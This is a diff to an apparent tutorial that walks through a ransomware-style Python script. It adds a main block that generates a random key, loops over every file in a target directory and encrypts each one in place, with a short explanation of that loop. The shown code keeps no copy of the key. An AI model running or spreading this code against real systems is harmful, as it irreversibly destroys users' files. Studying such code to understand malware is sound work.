@@ -51,13 +51,20 @@ with open(TARGET_DIR + filename, "wb") as f:
     print(f"[+] Encrypted {TARGET_DIR + filename}")
 
 ```
-This fuction writes the encrypted bytes into the original file in binary mode. 
+This function writes the encrypted bytes back into the original file in binary mode. 
 
-
-The key
 ```python
+if __name__=="__main__":
+    key = os.urandom(16)
+    for subdir, dirs, files in os.walk(TARGET_DIR):
+        for file in files:
+            print(f"file name: {file}")
+            encrypt(file, key)
 
 ```
+The last part contains the key and block of tasks. The key will be randomly generated (16 bytes). The programme looks inside the specific directory and loops through all the files inside it, prints the filenames and encrypts them. 
+
+
 ```python
 
 ```
